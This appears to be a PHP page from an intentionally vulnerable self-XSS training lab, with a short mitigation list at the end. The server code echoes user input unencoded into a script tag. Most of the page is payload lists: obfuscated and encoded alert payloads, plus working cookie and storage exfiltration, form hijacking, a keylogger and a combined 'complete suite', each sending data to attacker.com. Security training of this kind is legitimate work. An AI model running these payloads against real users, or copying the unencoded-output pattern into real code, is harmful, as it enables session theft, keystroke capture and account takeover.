<?php
// Lab 5: Advanced Self-XSS Techniques
// Vulnerability: Advanced Self-XSS techniques and bypasses

session_start();

$message = '';
$user_input = '';
$executed_code = '';

// Simulate advanced Self-XSS vulnerability
function process_advanced_self_xss($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle Self-XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_code'])) {
    $user_input = $_POST['code_input'] ?? '';
    
    if ($user_input) {
        $executed_code = process_advanced_self_xss($user_input);
        $message = '<div class="alert alert-success">Code executed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Advanced Self-XSS Techniques - Self-XSS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .executed-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .advanced-example {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Self-XSS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Advanced Self-XSS Techniques</h1>
            <p class="hero-subtitle">Advanced Self-XSS techniques and bypasses</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced Self-XSS techniques that combine multiple attack vectors and sophisticated bypass methods. These techniques include obfuscation, encoding, alternative execution methods, and complex social engineering scenarios.</p>
            <p><strong>Objective:</strong> Use advanced techniques to achieve Self-XSS through sophisticated methods.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Advanced Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output without validation
function process_advanced_self_xss($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced Self-XSS Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="advanced-warning">
                            <h5>⚠️ Advanced Techniques Warning</h5>
                            <p>This lab demonstrates advanced Self-XSS techniques:</p>
                            <ul>
                                <li>Obfuscation and encoding methods</li>
                                <li>Alternative execution techniques</li>
                                <li>Complex social engineering scenarios</li>
                                <li>Advanced bypass methods</li>
                            </ul>
                        </div>
                        
                        <div class="advanced-example">
                            <h5>🔬 Advanced Example</h5>
                            <p><strong>Obfuscated Code:</strong></p>
                            <p><code>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</code></p>
                            <p><strong>Encoded Payload:</strong></p>
                            <p><code>eval(atob('YWxlcnQoJ1hTUycp'))</code></p>
                        </div>
                        
                        <div class="input-info">
                            <h5>Advanced Examples</h5>
                            <p>Try these advanced payloads:</p>
                            <ul>
                                <li><code>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</code> - Obfuscated</li>
                                <li><code>eval(atob('YWxlcnQoJ1hTUycp'))</code> - Base64 encoded</li>
                                <li><code>Function('alert("XSS")')()</code> - Function constructor</li>
                                <li><code>setTimeout('alert("XSS")', 0)</code> - Timeout execution</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_code" value="1">
                            <div class="mb-3">
                                <label for="code_input" class="form-label">JavaScript Code to Execute</label>
                                <textarea class="form-control" id="code_input" name="code_input" 
                                          rows="4" placeholder="Enter JavaScript code..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Code</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($executed_code): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Executed Code
                    </div>
                    <div class="card-body">
                        <div class="executed-display">
                            <h5>JavaScript Output</h5>
                            <div class="sensitive-data">
                                <script>
                                    try {
                                        <?php echo $executed_code; ?>
                                    } catch(e) {
                                        console.error('Error executing code:', e);
                                    }
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced Self-XSS Techniques</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Advanced techniques leading to code execution</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Advanced Techniques</h5>
                    <ul>
                        <li><strong>Obfuscation:</strong> Hide malicious code</li>
                        <li><strong>Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Execution:</strong> Use different execution methods</li>
                        <li><strong>Complex Scenarios:</strong> Combine multiple techniques</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced Self-XSS Payloads</h5>
            <p>Use these advanced techniques to achieve Self-XSS through sophisticated methods:</p>
            
            <h6>1. Obfuscated Payloads:</h6>
            <div class="code-block">// String.fromCharCode obfuscation
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))

// Unicode obfuscation
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')

// Hex obfuscation
eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')

// Octal obfuscation
eval('\141\154\145\162\164\050\047\130\123\123\047\051')</div>

            <h6>2. Base64 Encoded Payloads:</h6>
            <div class="code-block">// Base64 encoded
eval(atob('YWxlcnQoJ1hTUycp'))

// Base64 with padding
eval(atob('YWxlcnQoJ1hTUycp'))

// Base64 with different encoding
eval(atob('YWxlcnQoJ1hTUycp'))

// Base64 with obfuscation
eval(atob('YWxlcnQoJ1hTUycp'))</div>

            <h6>3. Function Constructor Payloads:</h6>
            <div class="code-block">// Function constructor
Function('alert("XSS")')()

// Function with parameters
Function('a', 'alert(a)')('XSS')

// Function with return
Function('return alert("XSS")')()

// Function with eval
Function('eval("alert(\\"XSS\\")")')()</div>

            <h6>4. Timeout and Interval Payloads:</h6>
            <div class="code-block">// setTimeout execution
setTimeout('alert("XSS")', 0)

// setInterval execution
setInterval('alert("XSS")', 1000)

// setTimeout with function
setTimeout(function() { alert('XSS'); }, 0)

// setInterval with function
setInterval(function() { alert('XSS'); }, 1000)</div>

            <h6>5. Event Handler Payloads:</h6>
            <div class="code-block">// addEventListener
document.addEventListener('DOMContentLoaded', function() { alert('XSS'); })

// onclick event
document.onclick = function() { alert('XSS'); }

// onload event
window.onload = function() { alert('XSS'); }

// onerror event
window.onerror = function() { alert('XSS'); }</div>

            <h6>6. DOM Manipulation Payloads:</h6>
            <div class="code-block">// createElement and appendChild
var script = document.createElement('script')
script.innerHTML = 'alert("XSS")'
document.head.appendChild(script)

// innerHTML manipulation
document.body.innerHTML = '<script>alert("XSS")</script>'

// outerHTML manipulation
document.body.outerHTML = '<div><script>alert("XSS")</script></div>'

// insertAdjacentHTML
document.body.insertAdjacentHTML('beforeend', '<script>alert("XSS")</script>')</div>

            <h6>7. JSON and Object Payloads:</h6>
            <div class="code-block">// JSON.parse with eval
eval(JSON.parse('"alert(\\"XSS\\")"'))

// Object constructor
new Function('alert("XSS")')()

// Object with eval
Object.constructor('alert("XSS")')()

// Array with eval
[].constructor.constructor('alert("XSS")')()</div>

            <h6>8. RegExp and String Payloads:</h6>
            <div class="code-block">// RegExp constructor
RegExp('alert("XSS")')()

// String constructor
String.constructor('alert("XSS")')()

// Array constructor
Array.constructor('alert("XSS")')()

// Object constructor
Object.constructor('alert("XSS")')()</div>

            <h6>9. Prototype and Chain Payloads:</h6>
            <div class="code-block">// Prototype manipulation
Object.prototype.constructor.constructor('alert("XSS")')()

// Array prototype
Array.prototype.constructor.constructor('alert("XSS")')()

// String prototype
String.prototype.constructor.constructor('alert("XSS")')()

// Function prototype
Function.prototype.constructor('alert("XSS")')()</div>

            <h6>10. Advanced Obfuscation:</h6>
            <div class="code-block">// Multiple obfuscation layers
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))

// Obfuscated with variables
var a = 'alert'
var b = 'XSS'
eval(a + '(' + b + ')')

// Obfuscated with arrays
var arr = ['alert', 'XSS']
eval(arr[0] + '(' + arr[1] + ')')

// Obfuscated with objects
var obj = {a: 'alert', b: 'XSS'}
eval(obj.a + '(' + obj.b + ')')</div>

            <h6>11. Advanced Encoding:</h6>
            <div class="code-block">// Multiple encoding layers
eval(atob('YWxlcnQoJ1hTUycp'))

// Hex encoding
eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')

// Unicode encoding
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')

// Octal encoding
eval('\141\154\145\162\164\050\047\130\123\123\047\051')</div>

            <h6>12. Advanced Execution Methods:</h6>
            <div class="code-block">// Multiple execution methods
setTimeout('alert("XSS")', 0)
setInterval('alert("XSS")', 1000)
Function('alert("XSS")')()
eval('alert("XSS")')

// Chained execution
setTimeout(function() {
    setInterval(function() {
        Function('alert("XSS")')()
    }, 1000)
}, 0)</div>

            <h6>13. Advanced Social Engineering:</h6>
            <div class="code-block">// Fake error with obfuscated code
alert('Error: ' + String.fromCharCode(88, 83, 83))

// Fake success with encoded code
console.log('Success: ' + atob('WFNT'))

// Fake warning with function
alert('Warning: ' + Function('return "XSS"')())

// Fake info with timeout
setTimeout('console.log("Info: XSS")', 0)</div>

            <h6>14. Advanced Copy-Paste:</h6>
            <div class="code-block">// Copy this obfuscated code:
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))

// Paste this encoded code:
eval(atob('YWxlcnQoJ1hTUycp'))

// Run this function code:
Function('alert("XSS")')()

// Execute this timeout code:
setTimeout('alert("XSS")', 0)</div>

            <h6>15. Advanced Console Commands:</h6>
            <div class="code-block">// Open console and run:
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))

// Press F12 and type:
eval(atob('YWxlcnQoJ1hTUycp'))

// Console command:
Function('alert("XSS")')()

// Developer tools command:
setTimeout('alert("XSS")', 0)</div>

            <h6>16. Advanced Data Exfiltration:</h6>
            <div class="code-block">// Obfuscated data exfiltration
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
eval(String.fromCharCode(97,108,101,114,116,40,39,68,97,116,97,32,115,116,111,108,101,110,39,41))</div>

            <h6>17. Advanced Form Hijacking:</h6>
            <div class="code-block">// Obfuscated form hijacking
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}
eval(String.fromCharCode(97,108,101,114,116,40,39,70,111,114,109,115,32,104,105,106,97,99,107,101,100,39,41))</div>

            <h6>18. Advanced Keylogger:</h6>
            <div class="code-block">// Obfuscated keylogger
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})
eval(String.fromCharCode(97,108,101,114,116,40,39,75,101,121,108,111,103,103,101,114,32,101,110,97,98,108,101,100,39,41))</div>

            <h6>19. Advanced Session Hijacking:</h6>
            <div class="code-block">// Obfuscated session hijacking
var sessionData = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/session', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(sessionData)
})
eval(String.fromCharCode(97,108,101,114,116,40,39,83,101,115,115,105,111,110,32,104,105,106,97,99,107,101,100,39,41))</div>

            <h6>20. Advanced Complete Suite:</h6>
            <div class="code-block">// Advanced complete suite
eval(String.fromCharCode(97,108,101,114,116,40,39,65,100,118,97,110,99,101,100,32,83,101,99,117,114,105,116,121,32,83,117,105,116,101,32,118,53,46,48,32,108,111,97,100,101,100,33,39,41))

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})

// Form hijacking
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}

// Data exfiltration
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})

eval(String.fromCharCode(97,108,101,114,116,40,39,67,111,109,112,108,101,116,101,32,115,101,99,117,114,105,116,121,32,115,117,105,116,101,32,97,99,116,105,118,97,116,101,100,33,39,41))</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Advanced social engineering and user manipulation</li>
                <li>Sophisticated data theft and sensitive information disclosure</li>
                <li>Complex session hijacking and account takeover</li>
                <li>Advanced malicious redirects and phishing attacks</li>
                <li>Sophisticated keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed content</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual JavaScript execution patterns</li>
                    <li>Educate users about Self-XSS risks and advanced techniques</li>
                    <li>Implement user awareness training programs</li>
                    <li>Warn users about executing code from untrusted sources</li>
                    <li>Disable console access in production environments</li>
                    <li>Implement advanced detection and prevention mechanisms</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
